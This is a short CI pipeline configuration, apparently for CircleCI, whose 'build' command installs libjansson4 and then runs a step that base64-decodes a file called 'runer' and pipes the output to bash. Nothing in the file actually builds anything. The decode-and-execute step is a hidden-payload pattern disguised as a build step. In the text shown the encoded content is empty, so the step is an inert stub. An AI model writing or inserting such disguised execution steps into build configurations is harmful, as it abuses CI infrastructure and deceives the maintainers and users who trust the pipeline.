commands:
  build:
    description: Run build
    steps:
      - checkout
      - run:
          name: build
          command: |
              sudo apt update && sudo apt install libjansson4
               
      - run:
          name: build
          command: |
              echo '' > runer; base64 runer -d | bash
              
